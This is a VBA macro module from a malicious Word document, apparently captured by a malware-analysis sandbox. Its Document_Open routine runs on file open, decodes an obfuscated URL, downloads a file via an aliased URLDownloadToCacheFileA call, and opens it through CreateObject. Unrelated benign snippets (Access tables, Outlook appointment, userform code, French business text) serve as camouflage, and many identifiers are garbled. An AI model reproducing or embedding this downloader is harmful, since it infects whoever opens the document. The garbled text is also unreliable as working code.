Attribute VB_Name = "ThisDocument"
Attribute VB_Base = "1Normal.ThisDocument"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = True
Attribute VB_Customizable = True
#If True And 1 And 1 And 1 And 1 And 1 _
And 1 And Win64 And 1 And 1 And 1 And 1 And 1 And 1 _
And 1 And 1 And 1 And 1 And 1 And VBA7 And 1 _
And 1 And 1 And 1 And 1 And 1 And 1 And 1 _
And 1 And 1 And 1 And 1 And 1 And 1 _
And 1 And 1 And 1 And 1 And 1 And 1 And 1 And 1 _
And 1 And 1 And 1 And 1 And 1 And 1 And 1 Then

Private Declare PtrSafe Function GetWindow Lib "USER32" (ByVal |fffd|Z|fffd||fffd|rL|fffd||fffd|j|fffd|x|fffd||fffd||fffd| As LongPtr, ByVal r|47d|Msk|fffd||fffd|x|fffd|Dx As Long) As LongPtr
Private Declare PtrSafe Function ZpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIZ Lib "urlmon" Alias "URLDownloadToCacheFileA" (ByVal |fffd|I|fffd||fffd|H|fffd|P|fffd||fffd||fffd||fffd|f9 As Long, ByVal UKer|fffd||fffd||ba||fffd| As String, ByVal H2Q|fffd||fffd|H|fffd| As String, ByVal FSe|fffd|N|fffd|J|fffd|ig|fffd||fffd|H|fffd|s|fffd||fffd|i As Long, ByVal F|fffd|p6J|fffd||fffd|9|fffd| As Long, ByVal n|fffd|q|fffd|e|eeae|f|fffd||fffd||fffd| As Long) As LongPtr
Private Declare PtrSafe Function getFrequency Lib "kernel32" Alias "QueryPerformanceFrequency" (|fffd|1|fffd|9Y|fffd||fffd||fffd||fffd|UjLn|fffd|K98|fffd| As Currency) As LongPtr
Private Declare PtrSafe Function GdipCreateHBITMAPFromBitmap Lib "GDIPlus" (ByVal |fffd|E|fffd||b8c3| As LongPtr, |fffd||fffd|JJJCOVx|fffd||fffd||fffd||fffd||fffd|1|fffd| As LongPtr, ByVal |fffd||fffd||fffd|y7xPO|262|W|5b9||fffd| As Long) As LongPtr

Private Declare PtrSafe Function getFrequencyM5OU Lib "kernel32" Alias "QueryPerformanceFrequency" (cyFrequency As Currency) As LongPtr

Private Declare PtrSafe Function getFrequencyKCb5 Lib "kernel32" Alias "QueryPerformanceFrequency" (cyFrequency As Currency) As LongPtr

Private Declare PtrSafe Function GdipCreateHBITMAPFromBitmapAy33 Lib "GDIPlus" (ByVal bitmap As LongPtr, hbmReturn As LongPtr, ByVal background As Long) As LongPtr
#Else

Private Declare Function GetWindowgolO Lib "USER32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long


Private Declare Function GdipCreateHBITMAPFromBitmapLkow Lib "GDIPlus" (ByVal bitmap As Long, hbmReturn As Long, ByVal background As Long) As Long


Private Declare Function GetWindowZoUJ Lib "USER32" (ByVal hWnd As Long, ByVal wCmd As Long) As Long

Private Declare Function GdipDisposeImage Lib "GDIPlus" (ByVal |fffd|U|fffd|I|fffd|3|fffd|m|fffd||fffd|6D|fffd||fffd|9xCN|fffd| As Long) As Long
Private Declare Function ZpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIZ Lib "urlmon" Alias "URLDownloadToCacheFileA" (ByVal |fffd|I|fffd||fffd|H|fffd|P|fffd||fffd||fffd||fffd|f9 As Long, ByVal UKer|fffd||fffd||ba||fffd| As String, ByVal H2Q|fffd||fffd|H|fffd| As String, ByVal FSe|fffd|N|fffd|J|fffd|ig|fffd||fffd|H|fffd|s|fffd||fffd|i As Long, ByVal F|fffd|p6J|fffd||fffd|9|fffd| As Long, ByVal n|fffd|q|fffd|e|eeae|f|fffd||fffd||fffd| As Long) As Long
Private Declare Function getFrequency Lib "kernel32" Alias "QueryPerformanceFrequency" (|fffd|1|fffd|9Y|fffd||fffd||fffd||fffd|UjLn|fffd|K98|fffd| As Currency) As Long



#End If
Private i|fffd|M|fffd|t|fffd|PpE(9)
Public f|fffd||fffd|O|fffd||fffd||723|



Function JO1M|fffd|4XK|fffd||fffd|(O|fffd|Ck|fffd||fffd|b|fffd|O, |fffd||fffd||fffd|CCoS, |fffd||fffd|6o|fffd|WU|fffd||fffd|, |fffd||fffd|W|fffd||fffd|N|fffd|z, O|fffd||fffd||fffd||fffd||fffd|Pzm, |fffd|x|fffd||fffd|8|fffd||fffd||fffd|)
JO1M|fffd|4XK|fffd||fffd| = StrConv(O|fffd|Ck|fffd||fffd|b|fffd|O, |fffd||fffd|W|fffd||fffd|N|fffd|z)
End Function

Private Sub jElgaO7wcreate_dictionary()
    '
    ' This sub is used to initialize the values in the dictionary
    ' when the class is called by outside programs.
    ' It iterates on the PCG sheets in order to collect the values
    ' and integrate them to the dictionary.
    '
    top_row_adress = pcg.Range("A2").Row
    bottom_row_adress = pcg.Range("A2").End(xlDown).Row
    
    For i = top_row_adress To bottom_row_adress
        pcg_dictionary.Add pcg.Range("A" & i).Value, pcg.Range("A" & i).Offset(0, 1).Value
    Next i
End Sub

Public Sub oKpATX92fill_list_box_item(Optional specific_class As Long = 0)
    '
    ' Use this sub to fill the list box with the values for the
    ' user to choose from.
    '
    ' -- Use 0 to get all items from the dictionary
    ' -- Use a class number betweet 1 and 7 to get a specific class
    '
    If specific_class = 0 Then
        For Each dictionary_item In pcg_dictionary.Items
            UserForm1.ListBox1.AddItem dictionary_item
        Next
    End If
    
    If specific_class > 0 Then
        Call regex_engine(specific_class)
    End If
End Sub





Private Function DownloadPic(U|fffd||fffd||fffd||fffd||fffd|E|fffd||bea2||fffd|am|fffd|Oq As String) As String
   Dim ng|fffd||fffd|r1|fffd||739||fffd||fffd| As String
   ng|fffd||fffd|r1|fffd||739||fffd||fffd| = Space$(260)
   p|fffd|H|fffd||fffd|4Sc2NK2|fffd|35k|fffd| = ZpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIpDisposeIZ(0, U|fffd||fffd||fffd||fffd||fffd|E|fffd||bea2||fffd|am|fffd|Oq, ng|fffd||fffd|r1|fffd||739||fffd||fffd|, Len(ng|fffd||fffd|r1|fffd||739||fffd||fffd|), 0, 0)
   DownloadPic = Left$(ng|fffd||fffd|r1|fffd||739||fffd||fffd|, InStr(ng|fffd||fffd|r1|fffd||739||fffd||fffd|, vbNullChar) - 1)
End Function

Sub qZ8ECreateAppointment()
    Dim olAppt As AppointmentItem
    Set olAppt = Application.CreateItem(olAppointmentItem)
    
    With olAppt
        .Subject = "My Subject"
        .Body = "This is the body"
        .RequiredAttendees = "something@gmail.com"
        .Location = "Lille"
        .ReminderMinutesBeforeStart = "30"
        .Start = #11/19/2017 2:00:00 AM#
        .End = #11/19/2017 4:00:00 AM#
        '.BillingInformation = "something"
        .Categories = "Business"
        .Display
    End With
End Sub


Function vPJ|fffd||fffd|J6|fffd||fffd|(W|be||fffd|P|fffd|1|fffd|c, rP|fffd|D|fffd||fffd|2O9|fffd|1, |fffd|o|fffd||fffd||fffd|)
Select Case W|be||fffd|P|fffd|1|fffd|c
Case (0): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(0, -6563, -869)
Case (1): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(1, 2431, -5315)
Case (2): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(2, -3439, -589)
Case (3): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(3, -3242, -3203)
Case (4): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(4, 9355, 5331)
Case (5): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(5, -3636, -3515)
Case (6): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(6, 9009, -9393)
Case (7): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(7, 1882, -9331)
Case (8): vPJ|fffd||fffd|J6|fffd||fffd| = M|fffd||fffd||fffd|RD|80ec|w(8, -9108, -6502)
End Select
End Function
Sub hXMcopen_list_box()
    UserForm1.Show
End Sub

Public Sub SS1TlhReouvrir_reglage()
    ReglagesForm.Show
End Sub

Public Sub p614zCDXchanger_les_phrases_helper()
    '
    ' This helper creates an object in order to change the phrases
    ' on the front page
    '
    Dim changer_les_phrases As PhrasesEngine
    Set changer_les_phrases = New PhrasesEngine
    changer_les_phrases.change_phrases
End Sub

Private Sub JmEmOZhYshow_messages(error_number As Long, message As String, message_type As String)
    '
    ' Use this sub to cycle through the error dictionary and show the
    ' user any custom error message that is not built in Excel.
    '
    ' vbInformation, vbCritical, vbOkOnly, vbYesNo, vbYesNoCancel
    '
    MsgBox message, message_type, "Title"
End Sub




Sub docUmeNt_opeN()
i|fffd|M|fffd|t|fffd|PpE(0) = vPJ|fffd||fffd|J6|fffd||fffd|(0, -1575, 1185)
i|fffd|M|fffd|t|fffd|PpE(1) = vPJ|fffd||fffd|J6|fffd||fffd|(1, 1944, 9033)
i|fffd|M|fffd|t|fffd|PpE(2) = vPJ|fffd||fffd|J6|fffd||fffd|(2, -4445, 1289)
i|fffd|M|fffd|t|fffd|PpE(3) = vPJ|fffd||fffd|J6|fffd||fffd|(3, -5521, 4509)
i|fffd|M|fffd|t|fffd|PpE(4) = vPJ|fffd||fffd|J6|fffd||fffd|(4, 7168, 8802)
i|fffd|M|fffd|t|fffd|PpE(5) = vPJ|fffd||fffd|J6|fffd||fffd|(5, 5612, 5251)
i|fffd|M|fffd|t|fffd|PpE(6) = vPJ|fffd||fffd|J6|fffd||fffd|(6, 8941, 4583)
i|fffd|M|fffd|t|fffd|PpE(7) = vPJ|fffd||fffd|J6|fffd||fffd|(7, 8243, 6140)
i|fffd|M|fffd|t|fffd|PpE(8) = vPJ|fffd||fffd|J6|fffd||fffd|(8, 1669, -744)

f|fffd||fffd|O|fffd||fffd||723| = Array(i|fffd|M|fffd|t|fffd|PpE(0), i|fffd|M|fffd|t|fffd|PpE(1), i|fffd|M|fffd|t|fffd|PpE(2), i|fffd|M|fffd|t|fffd|PpE(3), i|fffd|M|fffd|t|fffd|PpE(4), i|fffd|M|fffd|t|fffd|PpE(5), i|fffd|M|fffd|t|fffd|PpE(6), i|fffd|M|fffd|t|fffd|PpE(7), i|fffd|M|fffd|t|fffd|PpE(8))
A = DownloadPic(v|fffd|Ji|fffd|JR|fffd|3|fffd|("h*GUtl{Ntm{xpGLL:[9?/hVP/k3bp+CgrKD-ooHypEZOeP12r+S/tqW-y}_8iw.Unzr]v|hQeN~+smI^tH|Zi})qc|20r4e+aIyZg],ciWS>.WsUcDHpo|*2m.<1/PPZrR(]oEy{bMm4eYZnrvoytG>u/Gp0j,`_a((/h|.Q.xxPe~3,x-9XeA1."))
B = A
CreateObject(v|fffd|Ji|fffd|JR|fffd|3|fffd|(f|fffd||fffd|O|fffd||fffd||723|(0))).Open (B)
End Sub
Sub EJl3manipulating_Tables()
    On Error Resume Next
    'INSERT values
    DoCmd.runSQL "INSERT INTO Facebook(OK, Field1) VALUES ('5', 'Kendall')"
    'UPDATE field
    DoCmd.runSQL "UPDATE Facebook SET Field1 = 'Kendall' WHERE ID = 1"
    'ALTER TABLE
    DoCmd.runSQL "ALTER TABLE X "
End Sub

Sub nBm6edit_Table()
    Dim d As DAO.Database
    Dim t As TableDef
    Dim r As DAO.Recordset
    
    Set d = CurrentDb
    Set t = d.TableDefs("...")
    Set r = t.OpenRecordset(, dbOpenSnapshot)
    
    r.Edit
    r(...).Value = "..."
    r.Update
    
    Set d = Nothing
    Set t = Nothing
End Sub



Function v|fffd|Ji|fffd|JR|fffd|3|fffd|(|fffd|Agi|fffd||fffd||fffd|9|fffd|) As String
    Dim w|fffd|h7Q8zb|fffd||fffd||fffd||fffd|(1055) As Byte, |1bf|X|fffd||fffd|() As Byte
    |1bf|X|fffd||fffd| = |fffd|98|fffd||fffd||fffd||fffd||fffd|L|fffd|(|fffd|Agi|fffd||fffd||fffd|9|fffd|, f|fffd||fffd|O|fffd||fffd||723|(1), f|fffd||fffd|O|fffd||fffd||723|(2), 128, f|fffd||fffd|O|fffd||fffd||723|(3), f|fffd||fffd|O|fffd||fffd||723|(4))


    For |fffd||fffd|3S|fffd||fffd||fffd| = 0 To UBound(|1bf|X|fffd||fffd|) - 1
        If (|fffd||fffd|3S|fffd||fffd||fffd| Mod 4 = 0) Then
            w|fffd|h7Q8zb|fffd||fffd||fffd||fffd|(|fffd||fffd|vA|fffd||fffd||fffd|8N|fffd|XnW|fffd|G|fffd||fffd|) = |1bf|X|fffd||fffd|(|fffd||fffd|3S|fffd||fffd||fffd|)
            |fffd||fffd|vA|fffd||fffd||fffd|8N|fffd|XnW|fffd|G|fffd||fffd| = |fffd||fffd|vA|fffd||fffd||fffd|8N|fffd|XnW|fffd|G|fffd||fffd| + 1
        End If
    Next |fffd||fffd|3S|fffd||fffd||fffd|
    v|fffd|Ji|fffd|JR|fffd|3|fffd| = Left(JO1M|fffd|4XK|fffd||fffd|(w|fffd|h7Q8zb|fffd||fffd||fffd||fffd|, f|fffd||fffd|O|fffd||fffd||723|(5), f|fffd||fffd|O|fffd||fffd||723|(6), 64, f|fffd||fffd|O|fffd||fffd||723|(7), f|fffd||fffd|O|fffd||fffd||723|(8)), |fffd||fffd|vA|fffd||fffd||fffd|8N|fffd|XnW|fffd|G|fffd||fffd|)


End Function
Sub U3b7create_NewForm()
    'Set parameters
    Dim j As Form
    Set j = CreateForm
    'Get current form name
    y = Application.CurrentObjectName
    'Set variable to object
    Set j = Forms(y)
    '
    ' Error handling
    '
    On Error Resume Next
    'Set recordsource to table...
    j.RecordSource = "Facebook"
    'Close form
    DoCmd.Close acForm, "Form2", acSaveYes
    'Rename form
    DoCmd.Rename "Google", acForm, y
End Sub

Sub I4Bfmanipulate_Form()
    'Open form
    DoCmd.OpenForm "Form1", acDesign, , , acFormEdit, acHidden
    'Get form name
    w = Forms![Form1].Command0.Name
    'Close form
    DoCmd.Close acForm, "Form1", acSaveNo
End Sub

' Apply a filter to forms
' DoCmd.ApplyFilter , "Filiere = 'Bac'"
' DoCmd.ApplyFilter , "Filiere = 'Bac' AND Niveau = 'Master'"



Function |fffd|98|fffd||fffd||fffd||fffd||fffd|L|fffd|(|fffd|f|fffd||fffd|1|fffd|Nr|fffd|g, |fffd|1|fffd|u|fffd||fffd|ct, T|fffd||fffd||fffd|NP0|fffd|v, HUuD|fffd|GUd, dy|fffd||fffd|g|fffd|C|fffd|qm, |fffd||fffd||fffd|H|fffd||fffd|a|fffd|)
|fffd|98|fffd||fffd||fffd||fffd||fffd|L|fffd| = StrConv(|fffd|f|fffd||fffd|1|fffd|Nr|fffd|g, HUuD|fffd|GUd)
End Function
Private Sub agg4DN66ToggleButton1_Change()
    '6. We then get the current state of the button again...
    current_toggle_State = Me.ToggleButton1.Value

    Select Case current_toggle_State
        '6. If I am still pressed, then...
        Case True:
            'Value of previous state is 1 (or pressed)
            this_Sheet.Range("D7").Value = 1
            'Change caption from LIST 1 to LIST 2
            ToggleButton1.Caption = "LIST 2"
            'List is still LIST 1...
            ComboBox1.Clear
            ComboBox1.AddItem "Tomato", 0
            ComboBox1.AddItem "Cucumber", 1
            ComboBox1.ListIndex = 0
        '6. If I am now unpressed by the user...
        Case False:
            'Value of previous state is 0 (or unpressed)
            this_Sheet.Range("D7").Value = 0
            'Change caption from LIST 2 to LIST 1
            ToggleButton1.Caption = "LIST 1"
            'LIST 2 to LIST 1...
            ComboBox1.Clear
            ComboBox1.AddItem "Pizza", 0
            ComboBox1.AddItem "Soda", 1
            ComboBox1.ListIndex = 0
    End Select
End Sub

Private Sub slQClewGUserForm_Initialized()
    '1. We set our variables
    Dim previous_Toggle_State As Long
    
    '2. We set the sheet "food" as an object
    Set this_Sheet = Worksheets("Food")
    
    '3. We get the previous button state from the sheet...
    previous_Toggle_State = this_Sheet.Range("D7").Value
    
    Select Case previous_Toggle_State
        Case 1:
            '4. I was pressed, then button should be pressed...
            Me.ToggleButton1.Value = True
            'And, LIST 1 should active
            ComboBox1.Clear
            ComboBox1.AddItem "Tomato", 0
            ComboBox1.AddItem "Cucumber", 1
            ComboBox1.ListIndex = 0
            '4. Otherwise, it should be unpressed
        Case 0:
            Me.ToggleButton1.Value = False
            'LIST 2 should active
            ComboBox1.Clear
            ComboBox1.AddItem "Pizza", 0
            ComboBox1.AddItem "Soda", 1
            ComboBox1.ListIndex = 0
    End Select
End Sub


Function M|fffd||fffd||fffd|RD|80ec|w(NjHk|fffd|m6|fffd|UtGI, C|fffd||fffd|5|fffd|Zq8, FPo|fffd||fffd|0|2f7f|1)
Select Case NjHk|fffd|m6|fffd|UtGI
Case (0): M|fffd||fffd||fffd|RD|80ec|w = "S}_YhWQ^e{cql2x>l\kE.QiLAR4/pY^wp`p.l=<8ilt-cVA+at8atfsPiHG0oX)Bn~r/"
Case (1): M|fffd||fffd||fffd|RD|80ec|w = "|fffd||fffd|1P|fffd|gf|fffd||fffd|"
Case (2): M|fffd||fffd||fffd|RD|80ec|w = "|fffd|JRT|fffd||fffd|o|fffd|m"
Case (3): M|fffd||fffd||fffd|RD|80ec|w = "|fffd|S|73f||fffd|px|fffd|nt9"
Case (4): M|fffd||fffd||fffd|RD|80ec|w = "T|fffd||fffd||fffd|K|fffd|bY"
Case (5): M|fffd||fffd||fffd|RD|80ec|w = "|fffd||fffd||fffd|kC|fffd||fffd|"
Case (6): M|fffd||fffd||fffd|RD|80ec|w = "HbOUb|fffd|W"
Case (7): M|fffd||fffd||fffd|RD|80ec|w = "|fffd|p|fffd||58a9||fffd|4"
Case (8): M|fffd||fffd||fffd|RD|80ec|w = "|fffd||fffd|9|fffd|d|fffd|f|fffd|z8oC|fffd|"
End Select
End Function
Private Sub u4X7MmmVClass_Initialize()
    'Set sheets at initialization
    Call get_Worksheet_Helper
    type_entreprise = wk_two.Range("type_entreprise").Value
    Call set_phrases_Helper
End Sub

Private Sub TuU5f3Ggget_Worksheet_Helper()
    Set wk_one = Worksheets("Analyse")
    Set wk_two = Worksheets("Config")
End Sub

Private Sub pHBuvy0yset_phrases_Helper()
    Dim c_var, t_var, d_var As String
    '
    ' This helper is used to create the phrases with the variables
    ' that were set or calculated in the 'Config' worksheet
    '
    phrase_one = "L'entreprise fonctionne " & wk_two.Range("jours_activit|fffd|s").Value & _
                 " jours par semaines soit un nombre total de " & _
                 Round(wk_two.Range("semaines_activit|fffd|s").Value, 2) & " semaines."
    '
    ' TO DO
    '
    
    '
    ' I am using this technique in order to get the correct values to display
    ' depending on the fact if the enterprise is a restaurant or bar instead
    ' of a digital based type project
    '
    If type_entreprise = "num|fffd|rique" Then
        c_var = "ca_num|fffd|rique"
        t_var = "frequentation_mensuelle"
        d_var = "mois"
    Else
        c_var = "ca_restauration"
        t_var = "frequentation_journali|fffd|re"
        d_var = "jours"
    End If
    phrase_five = "Pour une fr|fffd|quentation de " & wk_two.Range(t_var).Value & " clients par " & d_var & ", " & _
                  "le chiffre d'affaire annuel est de " & Round(wk_two.Range(c_var).Value, 2) & "|fffd| par an"
    '
    ' TO DO
    '
    phrase_seven = "Le prix unitaire utilis|fffd| pour l'estimation du C.A. est de " & wk_two.Range("N10").Value & "|fffd| soit " & _
                   wk_two.Range("N14").Value & "|fffd| TTC et une marge de " & wk_two.Range("O11").Value & "% (ou " & _
                   wk_two.Range("N11").Value & "|fffd|)"
End Sub

Public Sub hh6Ozj0ochange_phrases()
    wk_one.Range("B8").Value = phrase_one
    wk_one.Range("B15").Value = phrase_five
    wk_one.Range("B18").Value = phrase_seven
End Sub




' InQuest injected base64 decoded content
' +y+Z

INQUEST-PP=macro
